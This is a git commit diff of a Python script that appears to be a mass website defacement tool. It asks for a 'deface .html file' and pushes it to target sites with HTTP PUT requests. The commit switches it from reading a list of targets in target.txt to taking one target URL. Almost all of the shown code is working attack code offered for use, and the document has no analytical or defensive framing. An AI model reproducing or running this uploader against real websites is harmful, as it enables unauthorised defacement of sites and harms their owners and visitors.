30f4d0004ab89b6964f55ff81516e24eef062601
GULPGULP <115177023+GULPGULP@users.noreply.github.com>
2023-08-16 12:30:30 +0200

    Update 1.py

--- 1.py
+++ 1.py
@@ -82,50 +82,40 @@ h = '\033[32m'
 m = '\033[00m'
 
 def x(tetew):
-   ipt = ''
-   if sys.version_info.major > 2:
-      ipt = input(tetew)
-   else:
-      ipt = raw_input(tetew)
-   
-   return str(ipt)
+    ipt = input(tetew)
+    return str(ipt)
 
-def aox(script,target_file="target.txt"):
-   op = open(script,"r").read()
-   with open(target_file, "r") as target:
-      target = target.readlines()
-      s = requests.Session()
-      print("uploading file to %d website"%(len(target)))
-      for web in target:
-         try:
-            site = web.strip()
-            if site.startswith("http://") is False:
-               site = "http://" + site
-            req = s.put(site+"/"+script,data=op)
-            if req.status_code > 200 or req.status_code >= 250:
-               print(m+"❌"+b+" FAILED"+m+" %s/%s"%(site,script))
-            else:
-               print(m+"✅"+h+" UPLOADED"+m+" %s/%s"%(site,script))
-
-         except requests.exceptions.RequestException:
-            continue
-         except KeyboardInterrupt:
-            print; exit()
+def aox(script, target_url):
+    op = open(script, "r").read()
+    s = requests.Session()
+    try:
+        site = target_url.strip()
+        if not site.startswith("http://"):
+            site = "http://" + site
+        req = s.put(site + "/" + script, data=op)
+        if req.status_code > 200 or req.status_code >= 250:
+            print(m + "❌" + b + " FAILED" + m + " %s/%s" % (site, script))
+        else:
+            print(m + "✅" + h + " UPLOADED" + m + " %s/%s" % (site, script))
+    except requests.exceptions.RequestException:
+        print(m + "❌" + b + " FAILED" + m + " %s" % target_url)
 
 def main(__bn__):
-   print(__bn__)
-   while True:
-      try:
-         a = x("Enter your deface .html file: ")
-         if not os.path.isfile(a):
-            print("file '%s' not found"%(a))
-            continue
-         else:
-            break
-      except KeyboardInterrupt:
-         print; exit()
+    print(__bn__)
+    while True:
+        try:
+            a = x("Enter your deface .html file: ")
+            if not os.path.isfile(a):
+                print("File '%s' not found" % a)
+                continue
+            else:
+                break
+        except KeyboardInterrupt:
+            print()
+            exit()
 
-   aox(a)
-
+    target_url = x("Enter the target website URL: ")
+    aox(a, target_url)
+   
 if __name__ == "__main__":
     main(banner)
